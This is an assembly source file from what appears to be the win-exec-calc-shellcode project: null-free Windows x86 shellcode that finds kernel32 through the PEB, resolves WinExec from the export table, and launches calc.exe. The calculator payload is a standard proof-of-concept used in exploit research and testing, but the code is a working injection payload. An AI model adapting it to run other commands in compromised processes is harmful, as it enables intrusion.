; Copyright (c) 2009-2014, Berend-Jan "SkyLined" Wever <berendjanwever@gmail.com>
; and Peter Ferrie <peter.ferrie@gmail.com>
; Project homepage: http://code.google.com/p/win-exec-calc-shellcode/
; All rights reserved. See COPYRIGHT.txt for details.

; Windows x86 null-free shellcode that executes calc.exe.
; Works in any x86 application for Windows 5.0-6.3 all service packs.
BITS 32
SECTION .text

%include 'type-conversion.asm'

; WinExec *requires* 4 byte stack alignment
%ifndef PLATFORM_INDEPENDENT
  %undef USE_COMMON                       ; not allowed as user-supplied
global _shellcode                         ; _ is needed because LINKER will add it automatically.
_shellcode:
  %ifdef FUNC
     PUSHAD
  %endif
  %ifdef STACK_ALIGN
    %ifdef FUNC
     MOV    EAX, ESP
     AND    ESP, -4
     PUSH   EAX
    %else
     AND    ESP, -4
    %endif
  %endif
    XOR     EDX, EDX                      ; EDX = 0
%elifndef USE_COMMON
  %ifdef FUNC
    PUSHAD
  %endif
    DEC     EDX
%endif
%ifndef USE_COMMON
    PUSH    EDX                           ; Stack = 0
    PUSH    B2DW('c', 'a', 'l', 'c')      ; Stack = "calc", 0
    PUSH    ESP
    POP     ECX                           ; ECX = &("calc")
    PUSH    EDX                           ; Stack = 0, "calc", 0
    PUSH    ECX                           ; Stack = &("calc"), 0, "calc", 0
; Stack contains arguments for WinExec
    MOV     ESI, [FS:EDX + 0x30]          ; ESI = [TEB + 0x30] = PEB
%else
    PUSH    ECX                           ; Stack = &("calc"), 0, "calc", 0
; Stack contains arguments for WinExec
    MOV     ESI, [FS:EDX + 0x2F]          ; ESI = [TEB + 0x30] = PEB (EDX=1)
%endif
    MOV     ESI, [ESI + 0x0C]             ; ESI = [PEB + 0x0C] = PEB_LDR_DATA
    MOV     ESI, [ESI + 0x0C]             ; ESI = [PEB_LDR_DATA + 0x0C] = LDR_MODULE InLoadOrder[0] (process)
    LODSD                                 ; EAX = InLoadOrder[1] (ntdll)
    MOV     ESI, [EAX]                    ; ESI = InLoadOrder[2] (kernel32)
    MOV     EDI, [ESI + 0x18]             ; EDI = [InLoadOrder[2] + 0x18] = kernel32 DllBase
; Found kernel32 base address (EDI)
%ifdef USE_COMMON
    MOV     DL, 0x50
    JMP     shellcode_common
%else
    MOV     EBX, [EDI + 0x3C]             ; EBX = [kernel32 + 0x3C] = offset(PE header)
; PE header (EDI+EBX) = @0x00 0x04 byte signature
;                       @0x04 0x18 byte COFF header
;                       @0x18      PE32 optional header (EDI + EBX + 0x18)
    MOV     EBX, [EDI + EBX + 0x18 + 0x60] ; EBX = [PE32 optional header + offset(PE32 export table offset)] = offset(export table)
; Found export table offset (EBX)
    MOV     ESI, [EDI + EBX + 0x20]       ; ESI = [kernel32 + offset(export table) + 0x20] = offset(names table)
    ADD     ESI, EDI                      ; ESI = kernel32 + offset(names table) = &(names table)
; Found export names table (ESI)
    MOV     EDX, [EDI + EBX + 0x24]       ; EDX = [kernel32 + offset(export table) + 0x24] = offset(ordinals table)
; Found export ordinals table (EDX)
find_winexec_x86:
; speculatively load ordinal (EBP)
    MOVZX   EBP, WORD [EDI + EDX]         ; EBP = [kernel32 + offset(ordinals table) + offset] = function ordinal
    INC     EDX
    INC     EDX                           ; EDX = offset += 2
    LODSD                                 ; EAX = &(names table[function number]) = offset(function name)
    CMP     [EDI + EAX], DWORD B2DW('W', 'i', 'n', 'E') ; *(DWORD*)(function name) == "WinE" ?
    JNE     find_winexec_x86              ;
    MOV     ESI, [EDI + EBX + 0x1C]       ; ESI = [kernel32 + offset(export table) + 0x1C] = offset(address table)] = offset(address table)
    ADD     ESI, EDI                      ; ESI = kernel32 + offset(address table) = &(address table)
    ADD     EDI, [ESI + EBP * 4]          ; EDI = kernel32 + [&(address table)[WinExec ordinal]] = offset(WinExec) = &(WinExec)
    CALL    EDI                           ; WinExec(&("calc"), 0);
  %ifndef PLATFORM_INDEPENDENT
    %ifdef FUNC
     POP    EAX
     POP    EAX
      %ifdef STACK_ALIGN
     POP    ESP
      %endif
     POPAD
     RET
    %endif
  %elifdef FUNC
     POP    EAX
     POP    EAX
     POPAD
    %ifdef STACK_ALIGN
     POP    ESP
    %endif
    %ifdef CLEAN
     XCHG   EDX, EAX
     POP    EAX
    %endif
     RET
  %endif
%endif